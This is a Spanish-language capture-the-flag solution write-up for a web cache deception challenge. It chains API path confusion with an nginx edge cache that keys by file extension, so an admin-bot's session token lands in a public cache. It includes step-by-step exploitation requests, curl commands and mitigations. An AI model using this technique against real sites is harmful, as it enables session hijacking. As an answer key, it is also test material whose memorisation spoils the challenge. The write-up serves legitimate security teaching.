# Solucion — api-cache-05 · Poisoned Edge

**Categoria:** api · **Dificultad:** insane · **Vuln central:** Web Cache Deception (path confusion en la API + cache-key inseguro en el edge/CDN) encadenada con un envenenamiento dirigido a una victima autenticada (admin-bot).

## Topologia

```
jugador ──> cache (nginx edge, .24:8080) ──> api:8000 (EdgeNews / FastAPI)
                 ▲
                 └── admin-bot (thread en la api) abre los enlaces compartidos
                     a traves del MISMO edge, con la cookie de sesion admin.
```

El jugador solo habla con el **edge** (`http://<host>:8080`). La API nunca se
expone directamente.

## Las dos piezas de la vulnerabilidad

| # | Capa | Fallo | Efecto |
|---|------|-------|--------|
| 1 | API (FastAPI) | **Path confusion**: `GET /api/v1/profile/{tail:path}` ignora `tail` y devuelve el MISMO perfil sensible que `/api/v1/profile`, incluido el `session_token` del usuario autenticado por cookie. | Una URL que termina en `.css` entrega contenido dinamico autenticado. |
| 2 | Edge (nginx) | **Cache-key inseguro**: para URLs que "parecen" estaticas (`.css/.js/...` o `/static/`) cachea por `metodo+host+uri` SIN la cookie, e **ignora** `Cache-Control: private, no-store` del backend (`proxy_ignore_headers`). | La respuesta personalizada de un usuario queda en una clave de cache PUBLICA. |

La API *intenta* protegerse (manda `Cache-Control: private, no-store`); el bug
real esta en el edge que lo ignora por extension. Eso es justo el patron de CDN
"cache everything by file extension" mal configurado del mundo real.

## La victima: el admin-bot

El endpoint `POST /api/v1/share?url=<ruta>` encola una ruta relativa. Un thread
interno (el "editor jefe") la desencola cada pocos segundos y la visita **a
traves del edge** enviando la **cookie de sesion admin**. Es la pieza que
convierte un bug pasivo en un robo de credenciales: el atacante elige *que* URL
cachea el admin.

## Explotacion paso a paso

1. **Registro** (recon): `POST /api/v1/register?username=pwn` → recibes tu cookie
   `session` y ves la forma del perfil en `/api/v1/profile`.

2. **Construir la URL envenenada** con path confusion + extension estatica:
   ```
   /api/v1/profile/<aleatorio>.css
   ```
   - La API ignora `<aleatorio>.css` y devuelve un perfil completo.
   - El edge la trata como asset estatico → la cacheara.
   - El `<aleatorio>` evita colisionar con la cache de otros jugadores.

3. **Compartir** la URL con el admin-bot:
   ```
   POST /api/v1/share?url=/api/v1/profile/<aleatorio>.css
   ```
   El bot la abre con SU cookie admin. El edge cachea la **respuesta del admin**
   (con su `session_token`) bajo la clave `.css` publica.

4. **Recoger el botin**: pedir la MISMA URL `.css` **sin cookie**:
   ```
   GET /api/v1/profile/<aleatorio>.css
   -> rol: admin
   -> session_token: adm_xxxxxxxx...      (header X-Edge-Cache: HIT)
   ```

5. **Leer la flag** con la cookie admin robada:
   ```
   GET /api/v1/admin/flag   (Cookie: session=adm_xxxx...)
   -> {"flag":"HL4{...}"}
   ```

Exploit completo: `python solution/exploit.py http://<host>:8080`
(espera unos segundos al ciclo del bot; reintenta el GET hasta ver `X-Edge-Cache: HIT`).

## Verificar el cacheo manualmente

```bash
# 1) sin cacheo: tu propia cookie te da TU perfil (rol: user)
curl -s -b "session=usr_..." "http://<host>:8080/api/v1/profile/x.css" -D-

# 2) tras compartir y esperar al bot, sin cookie, misma URL -> perfil admin
curl -s "http://<host>:8080/api/v1/profile/<el-mismo-aleatorio>.css" -D- | grep -i "X-Edge-Cache\|rol\|session_token"
#   X-Edge-Cache: HIT
#   rol: admin
#   session_token: adm_...
```

## Por que es INSANE

- No basta una sola vuln: hay que entender **dos capas** (router laxo de la API
  + politica de cache del edge) y **como interactuan**.
- Hay que **inferir el cache-key** del edge (que NO incluye la cookie y que se
  dispara por extension) — solo observable por el header `X-Edge-Cache` y por
  diferencias de respuesta.
- Hay que **orquestar a una victima**: dirigir al admin-bot a cachear su propia
  respuesta sensible en una clave que tu controlas, con su timing.
- La respuesta del backend dice explicitamente `private, no-store`: el jugador
  debe darse cuenta de que el edge lo ignora, no la API.

## Mitigaciones (didactico)

- **API**: no usar rutas `{tail:path}` que colapsen URLs distintas en la misma
  respuesta. Devolver 404 para sufijos no reconocidos. Marcar respuestas
  autenticadas con `Vary: Cookie`.
- **Edge/CDN**: decidir cacheabilidad por la **respuesta** (respetar
  `Cache-Control`/`Set-Cookie`), nunca solo por la extension de la URL.
  Incluir la cookie de sesion en la cache-key de contenido autenticado, o no
  cachear nada que lleve `Set-Cookie`/`private`. Normalizar la URL antes de
  decidir (la extension no implica recurso estatico).

## Nota anti-cheat

- La flag es **dinamica y unica por equipo** (HMAC del flag-service,
  `ARCHITECTURE §4`), inyectada por env `FLAG` en cada instancia. El
  `session_token` admin es **aleatorio por contenedor**, asi que el token robado
  de un equipo no sirve en otro.
- Compartir el metodo no da puntos: cada equipo debe envenenar SU propio edge.
  Enviar la flag de otro equipo dispara `cheat_flag_share` (`/whose-flag`).
- La path confusion, el `share` y la lectura del flag emiten eventos SIEM
  (`scan_detected` warn/alert) al collector; todas las peticiones del jugador a
  la API se loguean como `CTFREQ` (reqlog) para el overlay del stream.
